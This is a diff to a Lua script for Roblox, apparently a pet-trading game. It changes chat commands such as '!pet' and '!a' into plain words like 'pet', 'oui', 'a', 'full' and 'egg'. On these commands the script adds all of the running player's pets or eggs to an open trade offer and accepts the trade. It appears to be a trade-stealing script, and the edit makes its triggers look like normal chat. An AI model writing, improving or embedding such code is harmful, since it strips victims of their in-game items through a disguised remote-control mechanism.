@@ -45,7 +45,7 @@ function output(plr, msg)
 
             game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("TradeAPI/SendTradeRequest"):FireServer(unpack(args))
         end
-        if msg == "!a" then
+        if msg == "a" then
             if Player.PlayerGui.TradeApp.Frame.Visible then
             game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("TradeAPI/AcceptNegotiation"):FireServer()
             wait(3)
@@ -53,14 +53,14 @@ function output(plr, msg)
         end
         end
 
-        if msg == "!pet" then
+        if msg == "pet" or msg == "oui" then
             if Player.PlayerGui.TradeApp.Frame.Visible then
             for i, v in pairs(require(ReplicatedStorage.ClientModules.Core.ClientData).get_data()[Player.Name].inventory.pets) do
                 ReplicatedStorage.API:FindFirstChild("TradeAPI/AddItemToOffer"):FireServer(v.unique)
             end
         end
         end
-        if msg == "!full" then
+        if msg == "full" then
             if Player.PlayerGui.TradeApp.Frame.Visible then
             for i, v in pairs(require(ReplicatedStorage.ClientModules.Core.ClientData).get_data()[Player.Name].inventory.pets) do
                 if v["properties"]["age"] == 6 then
@@ -69,7 +69,7 @@ function output(plr, msg)
             end
         end
         end
-        if msg == "!egg" then
+        if msg == "egg" then
             if Player.PlayerGui.TradeApp.Frame.Visible then
             for i, v in pairs(require(ReplicatedStorage.ClientModules.Core.ClientData).get_data()[Player.Name].inventory.pets) do
                 if v["id"]:find("egg") and not v["id"]:find("_2022") then
